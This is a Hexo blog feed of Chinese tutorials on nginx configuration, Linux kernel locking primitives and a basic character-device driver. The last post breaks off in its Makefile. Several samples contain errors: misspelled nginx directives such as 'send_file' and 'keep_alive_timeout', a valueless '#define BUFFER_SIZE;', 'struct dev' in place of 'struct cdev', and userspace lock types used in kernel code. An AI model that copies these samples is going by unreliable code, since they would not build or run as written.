    <entry>
      <title>nginx使用教程</title>
      <link href="/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2022/07/06/nginx%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx使用教程"><a href="#nginx使用教程" class="headerlink" title="nginx使用教程"></a>nginx使用教程</h1><h3 id="1-什么是nginx"><a href="#1-什么是nginx" class="headerlink" title="1.什么是nginx?"></a>1.什么是nginx?</h3><p>nginx [engine x] 是 HTTP 和反向代理服务器、邮件代理服务器和通用 TCP&#x2F;UDP 代理服务器，最初由 Igor Sysoev 编写。 很长一段时间以来，它一直在许多负载很重的俄罗斯网站上运行，包括 Yandex、Mail.Ru、VK 和 Rambler。 根据 Netcraft 的数据，2022 年 5 月，nginx 服务或代理了 21.67% 最繁忙的网站。以下是一些成功案例：Dropbox、Netflix、Wordpress.com、FastMail.FM。</p><h3 id="2-如何部署安装nginx"><a href="#2-如何部署安装nginx" class="headerlink" title="2.如何部署安装nginx"></a>2.如何部署安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y nginx <span class="comment">#Ubuntu/Debian</span></span><br><span class="line">sudo yum install -y nginx <span class="comment">#rhel/centos</span></span><br></pre></td></tr></table></figure><h3 id="3-nginx的结构"><a href="#3-nginx的结构" class="headerlink" title="3.nginx的结构"></a>3.nginx的结构</h3><h4 id="3-1-nginx的启动方式"><a href="#3-1-nginx的启动方式" class="headerlink" title="3.1.nginx的启动方式"></a>3.1.nginx的启动方式</h4><p>nginx一般以守护进程启动,一个nginx服务至少包含一个master进程和一个work进程,master为nginx的守护进程用于管理work进程,和work进程为nginx接受请求后实际处理请求的进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">1((master nginx守护进程))--&gt;2((work1 工作进程1))</span><br><span class="line">1--&gt;3((work2 工作进程2))</span><br><span class="line">1--&gt;4((work3 工作进程3))</span><br></pre></td></tr></table></figure><h4 id="3-2-nginx的请求拦截器-重点"><a href="#3-2-nginx的请求拦截器-重点" class="headerlink" title="3.2.nginx的请求拦截器(重点)"></a>3.2.nginx的请求拦截器(重点)</h4><p>nginx的location请求拦截器,用于匹配连接请求,匹配成功后由该定义的资源路径以及返回方式处理并响应</p><p>nginx的location请求的匹配方式有以下几种</p><ul><li>1.完全匹配</li><li>2.非正则匹配</li><li>3.正则匹配</li><li>4.普通匹配</li></ul><p>优先级自上而下</p><h5 id="1-精确匹配"><a href="#1-精确匹配" class="headerlink" title="1.精确匹配"></a>1.精确匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location = /get&#123;</span><br><span class="line">root html;</span><br><span class="line"><span class="built_in">return</span> 200 <span class="string">&quot;hello you get!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#精确匹配一旦成功不会去尝试匹配别的匹配规则</span></span><br></pre></td></tr></table></figure><h5 id="2-非正则匹配"><a href="#2-非正则匹配" class="headerlink" title="2.非正则匹配"></a>2.非正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">location ^~&#123;</span><br><span class="line"><span class="built_in">return</span> 200 <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#匹配成功后不会去尝试匹配正则规则</span></span><br></pre></td></tr></table></figure><h5 id="3-正则匹配"><a href="#3-正则匹配" class="headerlink" title="3.正则匹配"></a>3.正则匹配</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ \*.php$/ &#123;</span><br><span class="line"><span class="built_in">return</span> 200 <span class="string">&quot;hello,location&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">location ~* \*.php$ &#123;</span><br><span class="line"><span class="built_in">return</span> 200 <span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#~*为不区分大小写的正则匹配</span></span><br></pre></td></tr></table></figure><h5 id="4-普通匹配-最长字符匹配"><a href="#4-普通匹配-最长字符匹配" class="headerlink" title="4.普通匹配(最长字符匹配)"></a>4.普通匹配(最长字符匹配)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /get &#123;</span><br><span class="line">root html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-3-nginx的日志文件以及错误重定向"><a href="#3-3-nginx的日志文件以及错误重定向" class="headerlink" title="3.3.nginx的日志文件以及错误重定向"></a>3.3.nginx的日志文件以及错误重定向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">access_log logs/access.log notice format;<span class="comment">#设置访问日志的存储路径以及日志等级和记录的日志格式</span></span><br><span class="line">error_log logs/error.log error;<span class="comment">#设置错误日志的存储路径和记录的日志格式</span></span><br><span class="line"></span><br><span class="line">error_page 404...(错误代码) /50x.html(重定向的location的地址)(也可以自定一个重定向的url)</span><br></pre></td></tr></table></figure><h3 id="4-nginx配置文件"><a href="#4-nginx配置文件" class="headerlink" title="4.nginx配置文件"></a>4.nginx配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#常用的参数配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置nginx启动的用户和用户组</span></span><br><span class="line">user nobody;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置nginx为守护进程方式启动</span></span><br><span class="line">daemon on;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置nginx的worker进程数(一般配置为cpu核心数)nginx至少包含一个master进程(nginx的守护进程用于管理worker进程)</span></span><br><span class="line">worker_processes 1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置nginx的错误日志的存放路径以及日志等级</span></span><br><span class="line">error_log logs/error.log notice;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置events</span></span><br><span class="line">&#123;</span><br><span class="line">worker_connections 1024;<span class="comment">#设置每个worker进程最大支持的连接数(和操作系统允许打开最大的文件描述符也有关系)</span></span><br><span class="line">use epoll;<span class="comment">#设置处理事件的io模型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置web服务</span></span><br><span class="line">http</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">#包含媒体文件类型</span></span><br><span class="line">include mime.types;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置nginx默认的返回数据类型</span></span><br><span class="line">default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置日志格式模板,可以用于后面日志调用</span></span><br><span class="line">log_format main <span class="string">&quot;<span class="variable">$remote_addr</span>:<span class="variable">$time_local</span>:<span class="variable">$remote_user</span>:<span class="variable">$request</span>:<span class="variable">$status</span> <span class="variable">$body_bytes_sent</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用linux内核提供的sendfile来传输数据(sendfile系统调用在两个文件描述符之间直接传递数据(完全在内核中操作)，从而避免了数据在内核缓冲区和用户缓冲区之间的拷贝，操作效率很高，被称之为零拷贝。)</span></span><br><span class="line">send_file on;</span><br><span class="line"></span><br><span class="line"><span class="comment">#(TCP_NOPUSH 是 FreeBSD 的一个 socket 选项，对应 Linux 的 TCP_CORK，Nginx 里统一用 tcp_nopush 来控制它，并且只有在启用了 sendfile 之后才生效。启用它之后，数据包会累计到一定大小之后才会发送，减小了额外开销，提高网络效率。)</span></span><br><span class="line">tcp_nopush on;</span><br><span class="line"></span><br><span class="line"><span class="comment">#尽快发送(减小延迟,但是会增多io读取次数)</span></span><br><span class="line">tcp_nodelay on;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置长连接的超时时间(长连接就是本来http一次完整的请求相应需要tcp三次握手四次挥手,长连接就是上一个处理完任务的连接先不进行释放,用于后续任务的再次数据收发,减少了响应时间,节省了网络资源)</span></span><br><span class="line">keep_alive_timeout 65;</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启压缩</span></span><br><span class="line">gzip on;</span><br><span class="line"><span class="comment">#指定gzip的压缩的文件类型</span></span><br><span class="line">gzip_types application/javascript;</span><br><span class="line"><span class="comment">#压缩等级(1-9)</span></span><br><span class="line">gzip_comp_level 1;</span><br><span class="line"><span class="comment">#指定gzip压缩后nginx加上响应头Accept-Endcoing</span></span><br><span class="line">gzip_vary on</span><br><span class="line"></span><br><span class="line"><span class="comment">#和操作系统有关系(一般使用默认即可)</span></span><br><span class="line">gzip_buffers number size;</span><br><span class="line"><span class="comment">#指定http的协议版本</span></span><br><span class="line">gzip_http_version 1.0|1.1;</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置最小文件压缩的长度</span></span><br><span class="line">gzip_min_length 1024;</span><br><span class="line"></span><br><span class="line">valid_referer none|blocked|server_names|string....//指定是否有效的referercd</span><br><span class="line"><span class="comment">#设置是否对服务端返回的结构进行压缩</span></span><br><span class="line">gzip_proxied off|expired|no-cache|no-store|private|no_last_modified|no_etag|auth|any;</span><br><span class="line"><span class="comment">#设置服务</span></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;<span class="comment">#设置监听的端口</span></span><br><span class="line">server_name localhost; <span class="comment">#服务端的名称(一般设置为域名)</span></span><br><span class="line">location /&#123;<span class="comment">#请求拦截器</span></span><br><span class="line">root html;<span class="comment">#资源的根目录(实际请求的目录为location目录加上根目录)</span></span><br><span class="line"><span class="comment">#alias html;#实际请求的目录为alias目录;</span></span><br><span class="line">index index.html index.htm;<span class="comment">#设置主页的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#location ~*^server#~代表后面的表达式为一个正则表达式(~*为不区分大小写的正则表达式)</span></span><br><span class="line"><span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#root html</span></span><br><span class="line"><span class="comment">#index index.php</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux字符设备并发访问控制</title>
      <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
      <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="linux字符设备并发访问控制"><a href="#linux字符设备并发访问控制" class="headerlink" title="linux字符设备并发访问控制"></a>linux字符设备并发访问控制</h1><h3 id="1-使用原子变量"><a href="#1-使用原子变量" class="headerlink" title="1.使用原子变量"></a>1.使用原子变量</h3><h5 id="1-1-原子变量类型"><a href="#1-1-原子变量类型" class="headerlink" title="1.1.原子变量类型"></a>1.1.原子变量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> counter;</span><br><span class="line">&#125;<span class="type">atomic_t</span>;</span><br></pre></td></tr></table></figure><h5 id="1-2-常用的api"><a href="#1-2-常用的api" class="headerlink" title="1.2.常用的api"></a>1.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">atomic_set</span><span class="params">(<span class="type">atomic_t</span> *v,<span class="type">int</span> i)</span>;<span class="comment">//设置原子变量的值</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">atomic_inc</span><span class="params">(<span class="type">atomic_t</span> *v)</span>;<span class="comment">//设置原子变量自加1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">atomic_dec</span><span class="params">(<span class="type">atomic_t</span> *v)</span>;<span class="comment">//设置原子变量自减1</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atomic_inc_and_test</span><span class="params">(<span class="type">atomic_t</span> *v)</span>;<span class="comment">//设置原子变量自加1       </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atomic_dec_and_test</span><span class="params">(<span class="type">atomic_t</span> *v)</span>;<span class="comment">//设置原子变量自减1</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">atomic_sub_and_test</span><span class="params">(<span class="type">int</span> i,<span class="type">atomic_t</span> *v)</span>;<span class="comment">//设置原子变量自减i</span></span><br></pre></td></tr></table></figure><h3 id="2-使用自旋锁"><a href="#2-使用自旋锁" class="headerlink" title="2.使用自旋锁"></a>2.使用自旋锁</h3><h5 id="2-1-自旋锁类型"><a href="#2-1-自旋锁类型" class="headerlink" title="2.1.自旋锁类型"></a>2.1.自旋锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">spinlock_t</span> lock;</span><br></pre></td></tr></table></figure><h5 id="2-2-常用的api"><a href="#2-2-常用的api" class="headerlink" title="2.2.常用的api"></a>2.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/spinlock.h&gt;</span></span></span><br><span class="line">spin_lock_init(<span class="type">spinlock_t</span> *lock);<span class="comment">//初始化自旋锁</span></span><br><span class="line">spin_lock(<span class="type">spinlock_t</span> *lock);<span class="comment">//获得自旋锁(成功立即返回),否则直到获得该自旋锁的进程释放该自旋锁</span></span><br><span class="line">spin_trylock(<span class="type">spinlock_t</span> *lock);<span class="comment">//成功获得自旋锁立即返回,否则返回假</span></span><br><span class="line">spin_unlock(<span class="type">spinlock_t</span> *lock);<span class="comment">//释放自旋锁</span></span><br></pre></td></tr></table></figure><h3 id="3-使用信号量"><a href="#3-使用信号量" class="headerlink" title="3.使用信号量"></a>3.使用信号量</h3><h5 id="3-1-信号量类型"><a href="#3-1-信号量类型" class="headerlink" title="3.1.信号量类型"></a>3.1.信号量类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">sem_t</span> sem</span><br></pre></td></tr></table></figure><h5 id="3-2-常用的api"><a href="#3-2-常用的api" class="headerlink" title="3.2.常用的api"></a>3.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/semaphore.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sema_init</span><span class="params">(<span class="keyword">struct</span> semaphore *sem,<span class="type">int</span> val)</span>;<span class="comment">//初始化信号量</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">down</span><span class="params">(<span class="keyword">struct</span> semaphore *sem)</span>;<span class="comment">//深度睡眠</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">down_interruptible</span><span class="params">(<span class="keyword">struct</span> semaphore *sem)</span>;<span class="comment">//浅度睡眠</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">up</span><span class="params">(<span class="keyword">struct</span> semaphore *sem)</span>;<span class="comment">//释放信号量</span></span><br></pre></td></tr></table></figure><h3 id="4-使用互斥锁"><a href="#4-使用互斥锁" class="headerlink" title="4.使用互斥锁"></a>4.使用互斥锁</h3><h5 id="4-1-互斥锁类型"><a href="#4-1-互斥锁类型" class="headerlink" title="4.1.互斥锁类型"></a>4.1.互斥锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mutex_t</span> mutex</span><br></pre></td></tr></table></figure><h5 id="4-2-常用的api"><a href="#4-2-常用的api" class="headerlink" title="4.2.常用的api"></a>4.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mutex_init</span><span class="params">(&amp;mymutext)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mutex_lock</span><span class="params">(<span class="keyword">struct</span> mutex *mutex)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mutex_unlock</span><span class="params">(<span class="keyword">struct</span> mutex *mutex)</span>;</span><br></pre></td></tr></table></figure><h3 id="5-并发访问控制的选择"><a href="#5-并发访问控制的选择" class="headerlink" title="5.并发访问控制的选择"></a>5.并发访问控制的选择</h3><p>1.不允许睡眠的上下文采用忙等待,不可以睡眠的上下文使和中断上下文使用忙等待类</p><p>2.允许睡眠的上下文,或者临界区代码执行时间过长的建议使用阻塞类</p><p>3.中断屏蔽仅在有与中断上下文共享资源时使用</p><p>4.共享资源如果只是简单的整形变量时使用原子变量</p>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核驱动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux字符设备驱动开发入门</title>
      <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
      <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="linux字符设备驱动开发入门"><a href="#linux字符设备驱动开发入门" class="headerlink" title="linux字符设备驱动开发入门"></a>linux字符设备驱动开发入门</h1><h3 id="1-基本步骤"><a href="#1-基本步骤" class="headerlink" title="1.基本步骤"></a>1.基本步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">a(&quot;申请设备号&quot;)--&gt;b(&quot;注册设备号&quot;)--&gt;c(&quot;设置设备对应的file_operations&quot;)--&gt;d(&quot;加入到内核链表&quot;)</span><br><span class="line">ab(&quot;MKDEV(major,minor)&quot;)--&gt;ac(&quot;register_chrdev_region()&quot;)--&gt;ad(&quot;cdev_init()&quot;)--&gt;ae(&quot;cdev_add()&quot;)</span><br></pre></td></tr></table></figure><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//驱动程序源码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mychar</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">dev_t</span> devnum;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> curlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dev</span> <span class="title">mydev</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">&#125;mychardev;</span><br><span class="line"><span class="comment">//设备打开函数</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mychar_open</span><span class="params">(<span class="keyword">struct</span> inode *node,<span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取结构体地址</span></span><br><span class="line">    filp-&gt;private_data = (<span class="type">void</span>*)container_of(node-&gt;i_cdev,<span class="keyword">struct</span> mychar,mydev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mychar_close</span><span class="params">(<span class="keyword">struct</span> inode *node,<span class="keyword">struct</span> file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">mychar_read</span><span class="params">(<span class="keyword">struct</span> file *filp,<span class="type">char</span> __user *buffer,<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span> count,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">mychar_write</span><span class="params">(<span class="keyword">struct</span> file *filp,<span class="type">const</span> <span class="type">char</span> __user *buffer,<span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span> count,<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">mychar_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp,<span class="type">unsigned</span> <span class="type">int</span> cmd,<span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __init <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//申请设备号</span></span><br><span class="line">    mychardev.devnum = MKDEV(<span class="number">11</span>,<span class="number">256</span>);</span><br><span class="line">    <span class="comment">//注册设备号</span></span><br><span class="line">    <span class="keyword">if</span>(register_chrdev_region(mychardev.devnum,<span class="number">1</span>,<span class="string">&quot;mychar&quot;</span>)!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(alloc_chrdev_region(&amp;mychardev.devnum,<span class="number">256</span>,<span class="number">1</span>,<span class="string">&quot;mychar&quot;</span>)!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            printk(<span class="string">&quot;register devnum error!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span>=</span></span><br><span class="line">    &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .open = mychar_open,</span><br><span class="line">        .release = mychar_close,</span><br><span class="line">        .read = mychar_read,</span><br><span class="line">        .write = mychar_write,</span><br><span class="line">        .unlocked_ioctl = mychar_ioctl,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置对应的文件操作函数</span></span><br><span class="line">    cdev_init(&amp;mychardev.mydev,&amp;fops);</span><br><span class="line">    <span class="comment">//加入到内核链表</span></span><br><span class="line">    cdev_add(&amp;mychardev.mydev,mychardev.devnum,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __exit <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    cdev_del(&amp;mychardev.mydev);</span><br><span class="line">    unregister_chrdev_region(mychardev.devnum,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);</span><br><span class="line">module_exit(my_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;404NotFound&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;just a char devices driver!&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//项目的Makefile</span><br><span class="line">KERNELDIR ?= /lib/modules/<span 